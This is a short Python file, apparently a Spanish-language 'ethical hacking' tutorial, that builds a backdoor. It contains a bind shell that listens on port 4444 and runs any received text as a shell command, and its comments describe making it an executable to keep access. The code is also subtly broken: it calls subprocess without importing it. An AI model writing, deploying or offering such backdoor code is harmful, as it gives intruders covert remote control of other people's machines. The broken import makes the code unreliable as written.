'''
PROYECTOS DE HACKING ETICO WITH PYTHON
CREACION DE UN BACKDOOR CON PYTHON
'''

# Este proyecto implica la creación de un backdoor para permitir acceso remoto a un sistema.

# Involucra programar un script en Python que actúe como un servidor, utilizando netcat para la conexión remota.

# Se detalla cómo crear el backdoor, convertirlo en un ejecutable y mantener el acceso al sistema.

import socket

# Función para ejecutar comandos
def execute_command(command):
    return subprocess.check_output(command, shell=True)

# Servidor
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0", 4444))
server_socket.listen(1)

print("Esperando conexión...")
conn, addr = server_socket.accept()
print(f"Conexión establecida con {addr}")

while True:
    command = conn.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = execute_command(command)
    conn.send(output)

conn.close()